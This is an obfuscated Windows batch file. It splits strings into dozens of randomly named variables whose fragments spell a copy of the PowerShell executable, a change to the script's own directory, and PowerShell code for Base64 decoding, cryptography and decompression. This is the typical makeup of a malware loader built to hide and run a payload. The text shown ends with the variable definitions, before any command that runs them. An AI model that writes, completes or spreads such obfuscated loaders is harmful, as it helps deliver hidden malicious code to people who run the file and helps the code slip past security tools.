@echo off
set "zZSFNBiNUH=\v"
set "fdmfOpMnhb= C"
set "ltAcQXTGZR=32"
set "yScmBxUjxv=we"
set "oNsWQcEMgf=we"
set "qvNiniuRMT=do"
set "bRZJuotlJw=Wi"
set "WcojNwgwnq=:\"
set "gumqvRPqRS=ll"
set "gGgrElqtcB=po"
set "TIrLDtaxaq=\W"
set "fgQhgytyXO= /"
set "BUTCRDzDkk=st"
set "oUZRToeCKz=s\"
set "PBrAyuzaDM=in"
set "liZQcxBmDD=he"
set "KTUAEJbaEv=Po"
set "MdPAkpTmke=1."
set "yyswykmTje=ow"
set "XDgNWRuYqi=rs"
set "bAbEhKqUQt=em"
set "ZjKgFWXYke=rS"
set "bjnFQDztvN=.e"
set "nBcXBvqnhV=py"
set "shqqalLzxv=co"
set "EqMKHpVlCL=nd"
set "WHFUoFWtLO=0\"
set "VBELxGqEBy=Sy"
set "ZzjIPipJdl=ll"
set "KSDtqtjqaN=ws"
set "CLUeguBxpX=y "
set "EOcgAgWyVY=he"
set "RscUWALlvK=xe"
set "hQoDRKfZrf=cd"
set "pNqMIUYBAD= %~dp0"
set "tnrkhLhrcz=kzuW"
set "qvuhaiPRfk=ay()"
set "dmXHBgCmNV=; };"
set "rBbCLqZEkv='[-1"
set "GFOCZNBbhw=stem"
set "ukEaMZJmxZ=iron"
set "LOxIWzcyKO=oin "
set "DTHRblabia=AXUW"
set "VUcwoljjgj=se()"
set "amZZrmWCBc=);$w"
set "XWYSqjqcOW=n ''"
set "mkyiqrHqJC=y.Cr"
set "qhqAiBhKhP=$DxN"
set "jtfmdzgPEA=rity"
set "iaRpYJtJkE=b6t6"
set "aBprIWVMsK=Comp"
set "MOCKFaSgZZ=Zdf "
set "WSOhOjWrFg=::('"
set "uEToSsqUNK=morF"
set "QZkjmzfbyx=fore"
set "wGLxeWUaUE=1] -"
set "mUeCBpildv=]::N"
set "uVkBesCGaK=$LWy"
set "onZYawvYYO=em.C"
set "dSKDjJLUYW=oB.T"
set "kwKsNEtpLa=oArr"
set "MUWqrCGoyO=orF'"
set "OhSukRXwSK=hy.A"
set "cEMdVTaBdX=ew-O"
set "HdWzOxfnYz=[Sys"
set "ZKgAxjmPSd=Disp"
set "FjvnOOSwjU=Syst"
set "ORdJFvWtZE='gni"
set "bNJgVMlNOS=lit("
set "nHeeBXpOev=H = "
set "PHnPJcgNHY=MD.I"
set "HnqRgVBfIE=Obje"
set "kAirjKjkZd=JJ);"
set "HqnBszpMgQ=ct S"
set "iGjfcjmgBE=tem."
set "MaJrmFkPcV=ct S"
set "ScrJyPmJBL=New-"
set "waGDftwwUG=ionM"
set "TtVdEMrPFB=Secu"
set "TjATvujDja=g = "
set "tvqMgOHzWJ=n ''"
set "fKMcrZrmYG=m.IO"
set "iJXNSnGdWv=grap"
set "cMhZIJrZTa=k; }"
set "TlnHQlYxcH=eam("
set "CksmklYKrB=xNoB"
set "HffnjrdVwL=S46e"
set "GzBIMfVQUl=UM ="
